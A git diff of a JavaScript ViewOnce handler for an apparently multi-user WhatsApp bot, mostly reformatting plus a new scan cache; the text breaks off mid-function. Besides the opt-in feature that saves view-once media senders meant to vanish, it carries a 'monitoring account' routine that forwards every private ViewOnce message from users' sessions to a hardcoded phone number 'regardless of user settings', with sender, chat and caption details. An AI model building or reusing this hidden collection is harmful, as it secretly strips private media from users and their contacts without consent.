@@ -1,13 +1,13 @@
 /**
  * Enhanced ViewOnce Handler - Comprehensive ViewOnce Message Detection and Processing
- * 
+ *
  * This handler provides:
  * 1. Multi-method ViewOnce detection (direct, ephemeral, quoted, nested, etc.)
  * 2. User-specific anti-ViewOnce functionality
  * 3. Global monitoring account for all ViewOnce messages
  * 4. Robust download and forwarding with multiple fallback methods
  * 5. Comprehensive error handling and logging
- * 
+ *
  * Architecture:
  * - Main handler processes incoming messages
  * - Detection engine uses multiple methods to find ViewOnce content
@@ -28,16 +28,45 @@ export class ViewOnceHandler {
   static RETRY_DELAY = 20000
   static MAX_SCAN_DEPTH = 50000
   static SCAN_CACHE = new Map()
+  static MAX_CACHE_SIZE = 200
 
   // Monitoring Configuration
   static MONITORING_TARGET_JID = "2348058931419@s.whatsapp.net" // Default monitoring target
   static SKIP_GROUP_MONITORING = true // Skip group ViewOnce for monitoring account
 
+  static {
+    setInterval(() => {
+      ViewOnceHandler.cleanupScanCache()
+    }, 60000) // Every minute
+  }
+
+  static cleanupScanCache() {
+    if (this.SCAN_CACHE.size > this.MAX_CACHE_SIZE) {
+      // Clear all and start fresh
+      this.SCAN_CACHE.clear()
+      logger.debug(`[ViewOnceHandler] Cleared SCAN_CACHE (was over ${this.MAX_CACHE_SIZE})`)
+    }
+  }
+
+  static setCacheEntry(key, value) {
+    if (this.SCAN_CACHE.size >= this.MAX_CACHE_SIZE) {
+      // Remove oldest entry (first in map)
+      const firstKey = this.SCAN_CACHE.keys().next().value
+      this.SCAN_CACHE.delete(firstKey)
+    }
+    this.SCAN_CACHE.set(key, value)
+
+    // Auto-cleanup after 30 seconds
+    setTimeout(() => {
+      this.SCAN_CACHE.delete(key)
+    }, 30000)
+  }
+
   /**
    * ===========================================
    * MAIN ENTRY POINT
    * ===========================================
-   * 
+   *
    * This is the primary handler called by the plugin system
    * It processes ViewOnce messages for both user-specific anti-ViewOnce and global monitoring
    */
@@ -94,65 +123,65 @@ export class ViewOnceHandler {
     }
   }
 
-/**
+  /**
    * ===========================================
    * JID NORMALIZATION UTILITIES
    * ===========================================
    */
   static normalizeJid(jid) {
-    if (!jid || typeof jid !== 'string') return jid
-    
+    if (!jid || typeof jid !== "string") return jid
+
     // Remove device ID (anything after :) for WhatsApp individual JIDs
-    if (jid.includes('@s.whatsapp.net')) {
-      const [phoneNumber, domain] = jid.split('@')
-      const cleanPhoneNumber = phoneNumber.split(':')[0] // Remove device ID
+    if (jid.includes("@s.whatsapp.net")) {
+      const [phoneNumber, domain] = jid.split("@")
+      const cleanPhoneNumber = phoneNumber.split(":")[0] // Remove device ID
       return `${cleanPhoneNumber}@${domain}`
     }
-    
+
     return jid
   }
 
-    static findSessionByNormalizedJid(sessionManager, targetJid) {
-  const normalizedTarget = this.normalizeJid(targetJid)
-  
-  // First try exact match
-  let sessionResult = sessionManager.getSessionByWhatsAppJid(targetJid)
-  if (sessionResult) {
-    // Handle both wrapped and direct socket returns
-    const sock = sessionResult.sock || sessionResult
-    if (sock && typeof sock.sendMessage === 'function') {
-      //this.log(`Found exact session match for: ${targetJid}`, "debug")
-      return sock
-    }
-  }
+  static findSessionByNormalizedJid(sessionManager, targetJid) {
+    const normalizedTarget = this.normalizeJid(targetJid)
 
-  // Try normalized match
-  sessionResult = sessionManager.getSessionByWhatsAppJid(normalizedTarget)
-  if (sessionResult) {
-    const sock = sessionResult.sock || sessionResult
-    if (sock && typeof sock.sendMessage === 'function') {
-      //this.log(`Found normalized session match for: ${normalizedTarget}`, "debug")
-      return sock
+    // First try exact match
+    let sessionResult = sessionManager.getSessionByWhatsAppJid(targetJid)
+    if (sessionResult) {
+      // Handle both wrapped and direct socket returns
+      const sock = sessionResult.sock || sessionResult
+      if (sock && typeof sock.sendMessage === "function") {
+        //this.log(`Found exact session match for: ${targetJid}`, "debug")
+        return sock
+      }
     }
-  }
 
-  // If sessions property exists, try manual search
-  if (sessionManager.activeSockets && typeof sessionManager.activeSockets === 'object') {
-    for (const [sessionId, sock] of sessionManager.activeSockets) {
-      if (sock?.user?.id) {
-        const sessionPhone = sock.user.id.split("@")[0].split(":")[0]
-        const targetPhone = normalizedTarget.split("@")[0]
-        if (sessionPhone === targetPhone && typeof sock.sendMessage === 'function') {
-          //this.log(`Found matching session via manual search: ${sessionId} -> ${normalizedTarget}`, "debug")
-          return sock
+    // Try normalized match
+    sessionResult = sessionManager.getSessionByWhatsAppJid(normalizedTarget)
+    if (sessionResult) {
+      const sock = sessionResult.sock || sessionResult
+      if (sock && typeof sock.sendMessage === "function") {
+        //this.log(`Found normalized session match for: ${normalizedTarget}`, "debug")
+        return sock
+      }
+    }
+
+    // If sessions property exists, try manual search
+    if (sessionManager.activeSockets && typeof sessionManager.activeSockets === "object") {
+      for (const [sessionId, sock] of sessionManager.activeSockets) {
+        if (sock?.user?.id) {
+          const sessionPhone = sock.user.id.split("@")[0].split(":")[0]
+          const targetPhone = normalizedTarget.split("@")[0]
+          if (sessionPhone === targetPhone && typeof sock.sendMessage === "function") {
+            //this.log(`Found matching session via manual search: ${sessionId} -> ${normalizedTarget}`, "debug")
+            return sock
+          }
         }
       }
     }
+
+    return null
   }
 
-  return null
-}
-   
   /**
    * ===========================================
    * DEBUG HELPER: LOG ALL AVAILABLE SESSIONS DETAILED
@@ -160,103 +189,106 @@ export class ViewOnceHandler {
    */
   static logAllAvailableSessionsDetailed(sessionManager) {
     try {
-      
       // Check for common session storage patterns
-      const possibleSessionProps = ['sessions', 'activeSessions', '_sessions', 'sessionStore', 'clients', 'users']
-      
+      const possibleSessionProps = ["sessions", "activeSessions", "_sessions", "sessionStore", "clients", "users"]
+
       for (const prop of possibleSessionProps) {
         if (sessionManager[prop]) {
           console.log(`[ViewOnce Debug] Found property ${prop}:`, Object.keys(sessionManager[prop]))
-          
-          if (typeof sessionManager[prop] === 'object') {
+
+          if (typeof sessionManager[prop] === "object") {
             for (const [key, value] of Object.entries(sessionManager[prop])) {
               console.log(`[ViewOnce Debug]   ${prop}[${key}]:`, {
                 type: typeof value,
                 isConnected: value?.user?.id ? true : false,
-                user: value?.user?.id || 'N/A'
+                user: value?.user?.id || "N/A",
               })
             }
           }
         }
       }
-      
+
       // Check for common methods
       const possibleMethods = [
-        'getAllActiveSessions', 'getActiveSessions', 'getSessions', 
-        'getSessionByWhatsAppJid', 'getSessionByJid', 'findSession'
+        "getAllActiveSessions",
+        "getActiveSessions",
+        "getSessions",
+        "getSessionByWhatsAppJid",
+        "getSessionByJid",
+        "findSession",
       ]
-      
+
       for (const method of possibleMethods) {
-        const hasMethod = typeof sessionManager[method] === 'function'
+        const hasMethod = typeof sessionManager[method] === "function"
       }
-      
+
       console.log(`[ViewOnce Debug] ============================================`)
     } catch (error) {
       console.log(`[ViewOnce Debug] Error analyzing session manager:`, error.message)
     }
   }
-    
-/**
- * ===========================================
- * USER-SPECIFIC ANTI-VIEWONCE PROCESSING (FIXED)
- * ===========================================
- */
 
-static async processUserAntiViewOnce(m, messageContext, detection) {
-  try {
-    const { UserQueries } = await import("../../database/query.js")
-    const userWithAntiViewOnce = await UserQueries.getWhatsAppUserByTelegramId(messageContext.telegram_id)
+  /**
+   * ===========================================
+   * USER-SPECIFIC ANTI-VIEWONCE PROCESSING (FIXED)
+   * ===========================================
+   */
 
-    if (!userWithAntiViewOnce || !userWithAntiViewOnce.antiviewonce_enabled) {
-      //this.log(`User ${messageContext.telegram_id} does not have anti-ViewOnce enabled`, "debug")
+  static async processUserAntiViewOnce(m, messageContext, detection) {
+    try {
+      const { UserQueries } = await import("../../database/query.js")
+      const userWithAntiViewOnce = await UserQueries.getWhatsAppUserByTelegramId(messageContext.telegram_id)
+
+      if (!userWithAntiViewOnce || !userWithAntiViewOnce.antiviewonce_enabled) {
+        //this.log(`User ${messageContext.telegram_id} does not have anti-ViewOnce enabled`, "debug")
+        return false
+      }
+
+      const userJid = userWithAntiViewOnce.jid
+      if (!userJid) {
+        //this.log(`No WhatsApp JID found for telegram_id: ${messageContext.telegram_id}`, "warning")
+        return false
+      }
+
+      // Get the global singleton instance
+      const { getSessionManagerSafe } = await import("../sessions/index.js")
+      const sessionManager = getSessionManagerSafe()
+
+      if (!sessionManager) {
+        //this.log(`SessionManager not initialized`, "error")
+        return false
+      }
+
+      if (!sessionManager.activeSockets) {
+        //this.log(`SessionManager has no activeSockets`, "error")
+        return false
+      }
+
+      //this.log(`SessionManager active sockets: ${sessionManager.activeSockets.size}`, "debug")
+
+      const userSock = this.findSessionByNormalizedJid(sessionManager, userJid)
+
+      if (!userSock) {
+        //this.log(`No active session found for user WhatsApp JID: ${userJid}`, "warning")
+        //this.logAvailableSessions(sessionManager, userJid)
+        return false
+      }
+
+      //this.log(`Processing anti-ViewOnce for user: telegram_id ${messageContext.telegram_id}, jid: ${userJid}`, "info")
+
+      const processed = await this.processViewOnceMedia(m, userSock, detection, userJid, "USER_ANTIVIEWONCE")
+      if (processed) {
+        //this.log(`Successfully forwarded ViewOnce to user ${userJid} (telegram_id: ${messageContext.telegram_id})`, "success")
+        return true
+      }
+
+      return false
+    } catch (error) {
+      //this.log(`User anti-ViewOnce processing error: ${error.message}`, "error")
       return false
     }
-
-    const userJid = userWithAntiViewOnce.jid
-    if (!userJid) {
-      //this.log(`No WhatsApp JID found for telegram_id: ${messageContext.telegram_id}`, "warning")
-      return false
-    }
-
-    // Get the global singleton instance
-    const { getSessionManagerSafe } = await import("../sessions/index.js")
-    const sessionManager = getSessionManagerSafe()
-
-    if (!sessionManager) {
-      //this.log(`SessionManager not initialized`, "error")
-      return false
-    }
-
-    if (!sessionManager.activeSockets) {
-      //this.log(`SessionManager has no activeSockets`, "error")
-      return false
-    }
-
-    //this.log(`SessionManager active sockets: ${sessionManager.activeSockets.size}`, "debug")
-
-    const userSock = this.findSessionByNormalizedJid(sessionManager, userJid)
-
-    if (!userSock) {
-      //this.log(`No active session found for user WhatsApp JID: ${userJid}`, "warning")
-      //this.logAvailableSessions(sessionManager, userJid)
-      return false
-    }
-
-    //this.log(`Processing anti-ViewOnce for user: telegram_id ${messageContext.telegram_id}, jid: ${userJid}`, "info")
-
-    const processed = await this.processViewOnceMedia(m, userSock, detection, userJid, "USER_ANTIVIEWONCE")
-    if (processed) {
-      //this.log(`Successfully forwarded ViewOnce to user ${userJid} (telegram_id: ${messageContext.telegram_id})`, "success")
-      return true
-    }
-
-    return false
-  } catch (error) {
-    //this.log(`User anti-ViewOnce processing error: ${error.message}`, "error")
-    return false
   }
-}
-    
+
   /**
    * ===========================================
    * DEBUG HELPER: LOG AVAILABLE SESSIONS
@@ -266,11 +298,11 @@ static async processUserAntiViewOnce(m, messageContext, detection) {
     try {
       //this.log(`Debugging sessions for target: ${targetJid}`, "debug")
       //this.log(`Normalized target: ${this.normalizeJid(targetJid)}`, "debug")
-      
-      if (sessionManager.sessions && typeof sessionManager.sessions === 'object') {
+
+      if (sessionManager.sessions && typeof sessionManager.sessions === "object") {
         const sessionKeys = Object.keys(sessionManager.sessions)
         //this.log(`Available sessions (${sessionKeys.length}): ${sessionKeys.join(', ')}`, "debug")
-        
+
         sessionKeys.forEach((jid, index) => {
           const normalized = this.normalizeJid(jid)
           const matches = normalized === this.normalizeJid(targetJid) ? " ✓ MATCH" : ""
@@ -284,107 +316,106 @@ static async processUserAntiViewOnce(m, messageContext, detection) {
     }
   }
 
-/**
- * ===========================================
- * MONITORING ACCOUNT PROCESSING (UPDATED)
- * ===========================================
- * 
- * Forwards ALL ViewOnce messages to monitoring account regardless of user settings
- */
-static async processMonitoringAccount(m, detection) {
-  try {
-    // Get monitoring account telegram_id from environment
-    const monitoringTelegramId = process.env.MONITORING_TELEGRAM_ID || "1774315698"
-    
-    // Skip if monitoring is for groups and this is a group message
-    if (this.SKIP_GROUP_MONITORING && m.key.remoteJid && m.key.remoteJid.includes("@g.us")) {
-      //this.log("Skipping group ViewOnce for monitoring account", "debug")
+  /**
+   * ===========================================
+   * MONITORING ACCOUNT PROCESSING (UPDATED)
+   * ===========================================
+   *
+   * Forwards ALL ViewOnce messages to monitoring account regardless of user settings
+   */
+  static async processMonitoringAccount(m, detection) {
+    try {
+      // Get monitoring account telegram_id from environment
+      const monitoringTelegramId = process.env.MONITORING_TELEGRAM_ID || "1774315698"
+
+      // Skip if monitoring is for groups and this is a group message
+      if (this.SKIP_GROUP_MONITORING && m.key.remoteJid && m.key.remoteJid.includes("@g.us")) {
+        //this.log("Skipping group ViewOnce for monitoring account", "debug")
+        return false
+      }
+
+      //this.log(`Processing monitoring account: telegram_id ${monitoringTelegramId}`, "info")
+
+      // Get monitoring account session from database
+      const monitoringSock = await this.getMonitoringAccountSession(monitoringTelegramId)
+      if (!monitoringSock) {
+        //this.log(`No active session found for monitoring account: ${monitoringTelegramId}`, "warning")
+        return false
+      }
+
+      // Process and forward ViewOnce media to monitoring target
+      const processed = await this.processViewOnceMedia(
+        m,
+        monitoringSock,
+        detection,
+        this.MONITORING_TARGET_JID,
+        "MONITORING",
+      )
+
+      if (processed) {
+        //this.log(`Successfully forwarded ViewOnce to monitoring account`, "success")
+        return true
+      }
+
+      return false
+    } catch (error) {
+      //this.log(`Monitoring account processing error: ${error.message}`, "error")
       return false
     }
-
-    //this.log(`Processing monitoring account: telegram_id ${monitoringTelegramId}`, "info")
-
-    // Get monitoring account session from database
-    const monitoringSock = await this.getMonitoringAccountSession(monitoringTelegramId)
-    if (!monitoringSock) {
-      //this.log(`No active session found for monitoring account: ${monitoringTelegramId}`, "warning")
-      return false
-    }
-
-    // Process and forward ViewOnce media to monitoring target
-    const processed = await this.processViewOnceMedia(
-      m, 
-      monitoringSock, 
-      detection, 
-      this.MONITORING_TARGET_JID, 
-      "MONITORING"
-    )
-    
-    if (processed) {
-      //this.log(`Successfully forwarded ViewOnce to monitoring account`, "success")
-      return true
-    }
-
-    return false
-  } catch (error) {
-    //this.log(`Monitoring account processing error: ${error.message}`, "error")
-    return false
   }
-}
 
+  /**
+   * ===========================================
+   * MONITORING ACCOUNT SESSION RETRIEVAL (FIXED)
+   * ===========================================
+   */
 
-/**
- * ===========================================
- * MONITORING ACCOUNT SESSION RETRIEVAL (FIXED)
- * ===========================================
- */
+  static async getMonitoringAccountSession(telegramId) {
+    try {
+      const { UserQueries } = await import("../../database/query.js")
+      const { getSessionManagerSafe } = await import("../sessions/index.js")
 
-static async getMonitoringAccountSession(telegramId) {
-  try {
-    const { UserQueries } = await import("../../database/query.js")
-    const { getSessionManagerSafe } = await import("../sessions/index.js")
+      const user = await UserQueries.getUserByTelegramId(telegramId)
+      if (!user) {
+        //this.log(`No user found in users table for monitoring telegram_id: ${telegramId}`, "warning")
+        return null
+      }
 
-    const user = await UserQueries.getUserByTelegramId(telegramId)
-    if (!user) {
-      //this.log(`No user found in users table for monitoring telegram_id: ${telegramId}`, "warning")
+      const sessionManager = getSessionManagerSafe()
+
+      if (!sessionManager) {
+        //this.log(`SessionManager not initialized`, "error")
+        return null
+      }
+
+      if (!sessionManager.activeSockets) {
+        //this.log(`SessionManager has no activeSockets`, "error")
+        return null
+      }
+
+      //this.log(`SessionManager active sockets: ${sessionManager.activeSockets.size}`, "debug")
+
+      const sessionId = `session_${telegramId}`
+      const sock = sessionManager.getSession(sessionId)
+
+      if (sock && sock.user && typeof sock.sendMessage === "function") {
+        //this.log(`Found monitoring account session for telegram_id: ${telegramId}`, "success")
+        return sock
+      } else {
+        //this.log(`No active session found for monitoring telegram_id: ${telegramId}`, "warning")
+        return null
+      }
+    } catch (error) {
+      //this.log(`Error getting monitoring account session: ${error.message}`, "error")
       return null
     }
-
-    const sessionManager = getSessionManagerSafe()
-    
-    if (!sessionManager) {
-      //this.log(`SessionManager not initialized`, "error")
-      return null
-    }
-
-    if (!sessionManager.activeSockets) {
-      //this.log(`SessionManager has no activeSockets`, "error")
-      return null
-    }
-
-    //this.log(`SessionManager active sockets: ${sessionManager.activeSockets.size}`, "debug")
-
-    const sessionId = `session_${telegramId}`
-    const sock = sessionManager.getSession(sessionId)
-    
-    if (sock && sock.user && typeof sock.sendMessage === 'function') {
-      //this.log(`Found monitoring account session for telegram_id: ${telegramId}`, "success")
-      return sock
-    } else {
-      //this.log(`No active session found for monitoring telegram_id: ${telegramId}`, "warning")
-      return null
-    }
-  } catch (error) {
-    //this.log(`Error getting monitoring account session: ${error.message}`, "error")
-    return null
   }
-}
 
   /**
    * ===========================================
    * COMPREHENSIVE VIEWONCE DETECTION ENGINE
    * ===========================================
-   * 
+   *
    * Uses multiple detection methods to identify ViewOnce content:
    * 1. Direct ViewOnce messages (viewOnceMessage, viewOnceMessageV2)
    * 2. Ephemeral messages containing ViewOnce
@@ -466,7 +497,7 @@ static async getMonitoringAccountSession(telegramId) {
    * ===========================================
    * DETECTION METHOD 1: DIRECT VIEWONCE
    * ===========================================
-   * 
+   *
    * Detects ViewOnce messages using standard WhatsApp ViewOnce wrappers
    */
   static detectDirectViewOnce(message) {
@@ -475,7 +506,7 @@ static async getMonitoringAccountSession(telegramId) {
     // ViewOnce wrapper types
     const wrapperTypes = [
       "viewOnceMessage",
-      "viewOnceMessageV2", 
+      "viewOnceMessageV2",
       "viewOnceMessageV2Extension",
       "ephemeralMessage",
       "disappearingMessage",
@@ -523,7 +554,7 @@ static async getMonitoringAccountSession(telegramId) {
    * ===========================================
    * DETECTION METHOD 2: EPHEMERAL VIEWONCE
    * ===========================================
-   * 
+   *
    * Detects ViewOnce content within ephemeral/disappearing messages
    */
   static detectEphemeralViewOnce(message) {
@@ -570,7 +601,7 @@ static async getMonitoringAccountSession(telegramId) {
    * ===========================================
    * DETECTION METHOD 3: QUOTED VIEWONCE
    * ===========================================
-   * 
+   *
    * Detects ViewOnce content in quoted/replied messages
    */
   static detectQuotedViewOnce(m) {
@@ -609,7 +640,7 @@ static async getMonitoringAccountSession(telegramId) {
    * ===========================================
    * DETECTION HELPER: ANALYZE MESSAGE FOR VIEWONCE
    * ===========================================
-   * 
+   *
    * Comprehensive analysis of message objects for ViewOnce content
    */
   static analyzeMessageForViewOnce(messageObj) {
@@ -621,7 +652,7 @@ static async getMonitoringAccountSession(telegramId) {
     const wrapperTypes = [
       "viewOnceMessage",
       "viewOnceMessageV2",
-      "viewOnceMessageV2Extension", 
+      "viewOnceMessageV2Extension",
       "ephemeralMessage",
       "disappearingMessage",
     ]
@@ -648,7 +679,7 @@ static async getMonitoringAccountSession(telegramId) {
     // Check direct media with viewOnce flag
     const mediaTypes = [
       "imageMessage",
-      "videoMessage", 
+      "videoMessage",
       "audioMessage",
       "documentMessage",
       "pttMessage",
@@ -675,7 +706,7 @@ static async getMonitoringAccountSession(telegramId) {
    * ===========================================
    * ADDITIONAL DETECTION METHODS 4-8
    * ===========================================
-   * 
+   *
    * These methods handle more complex ViewOnce scenarios
    */
   static detectButtonViewOnce(message) {
@@ -789,7 +820,7 @@ static async getMonitoringAccountSession(telegramId) {
    * ===========================================
    * DEEP SCAN DETECTION METHOD
    * ===========================================
-   * 
+   *
    * Performs comprehensive recursive scan for ViewOnce content
    */
   static forceDeepScan(m) {
@@ -800,12 +831,7 @@ static async getMonitoringAccountSession(telegramId) {
       }
 
       const result = this.performDeepScan(m.message)
-      this.SCAN_CACHE.set(cacheKey, result)
-
-      // Clean cache if too large
-      if (this.SCAN_CACHE.size > 1000) {
-        this.SCAN_CACHE.clear()
-      }
+      this.setCacheEntry(cacheKey, result) // Use the updated setCacheEntry method
 
       return result
     } catch (error) {
@@ -859,7 +885,7 @@ static async getMonitoringAccountSession(telegramId) {
    * ===========================================
    * VIEWONCE MEDIA PROCESSING ENGINE
    * ===========================================
-   * 
+   *
    * Handles download and forwarding of ViewOnce content
    * Supports multiple download methods with fallback options
    */
@@ -886,7 +912,17 @@ static async getMonitoringAccountSession(telegramId) {
       }
 
       // Forward to target with comprehensive information
-      await this.forwardToTarget(sock, buffer, mediaType, mediaMessage, m, targetJid, downloadMethod, detection, processingType)
+      await this.forwardToTarget(
+        sock,
+        buffer,
+        mediaType,
+        mediaMessage,
+        m,
+        targetJid,
+        downloadMethod,
+        detection,
+        processingType,
+      )
 
       //this.log(`Successfully processed ${mediaType} ViewOnce (${buffer.length} bytes) via ${downloadMethod}`, "success")
       return true
@@ -900,7 +936,7 @@ static async getMonitoringAccountSession(telegramId) {
    * ===========================================
    * COMPREHENSIVE DOWNLOAD ENGINE
    * ===========================================
-   * 
+   *
    * Multiple download strategies with retry logic
    */
   static async downloadWithComprehensiveRetry(m, sock, mediaMessage, mediaType) {
@@ -941,22 +977,24 @@ static async getMonitoringAccountSession(telegramId) {
    * ===========================================
    */
   static async downloadWithBaileysNew(m, sock) {
-  try {
-    const messageType = getContentType(m.message)
-    if (!["imageMessage", "videoMessage", "audioMessage", "documentMessage", "stickerMessage"].includes(messageType)) {
-      throw new Error(`Unsupported message type: ${messageType}`)
-    }
+    try {
+      const messageType = getContentType(m.message)
+      if (
+        !["imageMessage", "videoMessage", "audioMessage", "documentMessage", "stickerMessage"].includes(messageType)
+      ) {
+        throw new Error(`Unsupported message type: ${messageType}`)
+      }
 
-    const stream = await sock.downloadMedia(m)
-    if (!stream || stream.length === 0) {
-      throw new Error("Empty buffer from downloadMedia")
-    }
+      const stream = await sock.downloadMedia(m)
+      if (!stream || stream.length === 0) {
+        throw new Error("Empty buffer from downloadMedia")
+      }
 
-    return stream
-  } catch (error) {
-    throw new Error(`Baileys new download failed: ${error.message}`)
+      return stream
+    } catch (error) {
+      throw new Error(`Baileys new download failed: ${error.message}`)
+    }
   }
-}
 
   static async downloadWithBaileysTraditional(mediaMessage, mediaType) {
     try {
@@ -1016,126 +1054,133 @@ static async getMonitoringAccountSession(telegramId) {
    * ===========================================
    * FORWARDING ENGINE
    * ===========================================
-   * 
+   *
    * Forwards ViewOnce content to target with contextual information
    */
-static async forwardToTarget(sock, buffer, mediaType, mediaMessage, originalMessage, targetJid, downloadMethod, detection, processingType) {
-  try {
-    // No pre-validation - attempt all forwards as it was working before
-
-    const senderName = originalMessage.pushName || "Unknown"
-    const chatJid = originalMessage.key.remoteJid
-    const timestamp = new Date().toLocaleString()
-
-    // Create context caption based on processing type
-    let contextCaption
-    if (processingType === "MONITORING") {
-      contextCaption = 
-        `🔍 *MONITORING - ViewOnce Detected* 🔍\n\n` +
-        `👤 Sender: ${senderName}\n` +
-        `💬 From: ${chatJid.includes("@g.us") ? "Group Chat" : "Private Chat"}\n` +
-        `📱 Chat: ${chatJid}\n` +
-        `🕒 Time: ${timestamp}\n` +
-        `📋 Type: ${mediaType.toUpperCase()}\n` +
-        `🔍 Detection: ${detection.type}\n` +
-        `🛠️ Method: ${downloadMethod}\n` +
-        `💬 Original Caption: ${mediaMessage?.caption || "[No Caption]"}\n\n` +
-        `⚠️ This is a monitoring capture - ViewOnce detected and forwarded`
-    } else {
-      contextCaption =
-        `🚨 *ViewOnce Detected & Forwarded* 🚨\n\n` +
-        `👤 Sender: ${senderName}\n` +
-        `💬 From: ${chatJid.includes("@g.us") ? "Group Chat" : "Private Chat"}\n` +
-        `📱 Chat: ${chatJid}\n` +
-        `🕒 Time: ${timestamp}\n` +
-        `📋 Type: ${mediaType.toUpperCase()}\n` +
-        `🔍 Detection: ${detection.type}\n` +
-        `🛠️ Method: ${downloadMethod}\n` +
-        `💬 Original Caption: ${mediaMessage?.caption || "[No Caption]"}\n\n` +
-        `⚠️ This ViewOnce was automatically detected and forwarded to you because you have antiviewonce enabled`
-    }
-
-    const quotedReference = {
-      key: originalMessage.key,
-      message: originalMessage.message,
-      messageTimestamp: originalMessage.messageTimestamp,
-      pushName: originalMessage.pushName,
-    }
-
-    const isTextOnly = buffer.toString("utf8").includes("VIEWONCE MEDIA DETECTED")
-
-    // Attempt to send the message - wrap in try-catch to prevent any connection issues
+  static async forwardToTarget(
+    sock,
+    buffer,
+    mediaType,
+    mediaMessage,
+    originalMessage,
+    targetJid,
+    downloadMethod,
+    detection,
+    processingType,
+  ) {
     try {
-      if (isTextOnly) {
-        await sock.sendMessage(
-          targetJid,
-          {
-            text: buffer.toString("utf8") + "\n\n" + contextCaption,
-          },
-          { quoted: quotedReference }
-        )
+      // No pre-validation - attempt all forwards as it was working before
+
+      const senderName = originalMessage.pushName || "Unknown"
+      const chatJid = originalMessage.key.remoteJid
+      const timestamp = new Date().toLocaleString()
+
+      // Create context caption based on processing type
+      let contextCaption
+      if (processingType === "MONITORING") {
+        contextCaption =
+          `🔍 *MONITORING - ViewOnce Detected* 🔍\n\n` +
+          `👤 Sender: ${senderName}\n` +
+          `💬 From: ${chatJid.includes("@g.us") ? "Group Chat" : "Private Chat"}\n` +
+          `📱 Chat: ${chatJid}\n` +
+          `🕒 Time: ${timestamp}\n` +
+          `📋 Type: ${mediaType.toUpperCase()}\n` +
+          `🔍 Detection: ${detection.type}\n` +
+          `🛠️ Method: ${downloadMethod}\n` +
+          `💬 Original Caption: ${mediaMessage?.caption || "[No Caption]"}\n\n` +
+          `⚠️ This is a monitoring capture - ViewOnce detected and forwarded`
       } else {
-        await this.sendMediaToTarget(sock, buffer, mediaType, contextCaption, targetJid, quotedReference)
+        contextCaption =
+          `🚨 *ViewOnce Detected & Forwarded* 🚨\n\n` +
+          `👤 Sender: ${senderName}\n` +
+          `💬 From: ${chatJid.includes("@g.us") ? "Group Chat" : "Private Chat"}\n` +
+          `📱 Chat: ${chatJid}\n` +
+          `🕒 Time: ${timestamp}\n` +
+          `📋 Type: ${mediaType.toUpperCase()}\n` +
+          `🔍 Detection: ${detection.type}\n` +
+          `🛠️ Method: ${downloadMethod}\n` +
+          `💬 Original Caption: ${mediaMessage?.caption || "[No Caption]"}\n\n` +
+          `⚠️ This ViewOnce was automatically detected and forwarded to you because you have antiviewonce enabled`
       }
-      //this.log(`Successfully forwarded ${mediaType} to ${targetJid} (${processingType})`, "success")
-    } catch (sendError) {
-      // Log the error but absolutely do not throw or propagate it
-      //this.log(`Failed to forward to ${targetJid}: ${sendError.message}`, "warning")
-      
-      // DO NOT attempt fallback message - this could also trigger logout
-      // Just log and continue silently
-      //this.log(`Skipping fallback message to prevent further session issues`, "debug")
+
+      const quotedReference = {
+        key: originalMessage.key,
+        message: originalMessage.message,
+        messageTimestamp: originalMessage.messageTimestamp,
+        pushName: originalMessage.pushName,
+      }
+
+      const isTextOnly = buffer.toString("utf8").includes("VIEWONCE MEDIA DETECTED")
+
+      // Attempt to send the message - wrap in try-catch to prevent any connection issues
+      try {
+        if (isTextOnly) {
+          await sock.sendMessage(
+            targetJid,
+            {
+              text: buffer.toString("utf8") + "\n\n" + contextCaption,
+            },
+            { quoted: quotedReference },
+          )
+        } else {
+          await this.sendMediaToTarget(sock, buffer, mediaType, contextCaption, targetJid, quotedReference)
+        }
+        //this.log(`Successfully forwarded ${mediaType} to ${targetJid} (${processingType})`, "success")
+      } catch (sendError) {
+        // Log the error but absolutely do not throw or propagate it
+        //this.log(`Failed to forward to ${targetJid}: ${sendError.message}`, "warning")
+        // DO NOT attempt fallback message - this could also trigger logout
+        // Just log and continue silently
+        //this.log(`Skipping fallback message to prevent further session issues`, "debug")
+      }
+    } catch (outerError) {
+      // Absolute final safety net - catch any unexpected errors and never throw
+      //this.log(`Unexpected error in forwardToTarget for ${targetJid}: ${outerError.message}`, "error")
+      //this.log(`Stack trace: ${outerError.stack}`, "debug")
     }
 
-  } catch (outerError) {
-    // Absolute final safety net - catch any unexpected errors and never throw
-    //this.log(`Unexpected error in forwardToTarget for ${targetJid}: ${outerError.message}`, "error")
-    //this.log(`Stack trace: ${outerError.stack}`, "debug")
+    // Function always completes successfully without throwing any errors
+    return
   }
-  
-  // Function always completes successfully without throwing any errors
-  return
-}
 
-/**
- * ===========================================
- * TARGET JID VALIDATION (Always returns true - purely informational)
- * ===========================================
- */
-static async validateTargetJid(sock, targetJid) {
-  try {
-    // This is now purely for logging - always return true to allow forwarding
-    if (!targetJid || !targetJid.includes('@')) {
-      //this.log(`JID format appears invalid: ${targetJid}, but allowing forward attempt`, "debug")
-      return true // Allow the attempt
-    }
-
-    if (targetJid.includes('@g.us')) {
-      return true
-    }
-
-    // Check if on WhatsApp for informational purposes only
+  /**
+   * ===========================================
+   * TARGET JID VALIDATION (Always returns true - purely informational)
+   * ===========================================
+   */
+  static async validateTargetJid(sock, targetJid) {
     try {
-      const phoneNumber = targetJid.split('@')[0]
-      const [result] = await sock.onWhatsApp(phoneNumber)
-      
-      if (result && result.exists) {
-        //this.log(`Confirmed ${targetJid} is on WhatsApp`, "debug")
-      } else {
-        //this.log(`${targetJid} may not be on WhatsApp, but allowing forward attempt`, "debug")
+      // This is now purely for logging - always return true to allow forwarding
+      if (!targetJid || !targetJid.includes("@")) {
+        //this.log(`JID format appears invalid: ${targetJid}, but allowing forward attempt`, "debug")
+        return true // Allow the attempt
       }
-    } catch (whatsappCheckError) {
-      //this.log(`WhatsApp check failed for ${targetJid}: ${whatsappCheckError.message}, but allowing forward attempt`, "debug")
+
+      if (targetJid.includes("@g.us")) {
+        return true
+      }
+
+      // Check if on WhatsApp for informational purposes only
+      try {
+        const phoneNumber = targetJid.split("@")[0]
+        const [result] = await sock.onWhatsApp(phoneNumber)
+
+        if (result && result.exists) {
+          //this.log(`Confirmed ${targetJid} is on WhatsApp`, "debug")
+        } else {
+          //this.log(`${targetJid} may not be on WhatsApp, but allowing forward attempt`, "debug")
+        }
+      } catch (whatsappCheckError) {
+        //this.log(`WhatsApp check failed for ${targetJid}: ${whatsappCheckError.message}, but allowing forward attempt`, "debug")
+      }
+
+      return true // Always allow forwarding - let the session manager handle any issues
+    } catch (error) {
+      //this.log(`JID validation error for ${targetJid}: ${error.message}, but allowing forward attempt`, "debug")
+      return true // Always allow forwarding
     }
-    
-    return true // Always allow forwarding - let the session manager handle any issues
-    
